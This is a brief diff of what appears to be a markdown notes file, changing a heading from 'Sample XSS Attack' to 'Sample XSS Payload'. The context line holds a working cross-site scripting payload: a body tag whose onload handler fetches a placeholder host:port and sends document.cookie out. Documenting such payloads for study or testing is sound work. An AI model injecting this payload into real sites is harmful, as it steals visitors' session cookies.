@@ -10,7 +10,7 @@ If the data retrieved is the size of the Internet consider the following request
 
 `POST / {'application-type': 'text/plain'}`
 
-## Sample XSS Attack
+## Sample XSS Payload
 
 ``<body id=x tabindex=1 onload=fetch(`host:port/?data=${document.cookie}`)></body>``
 
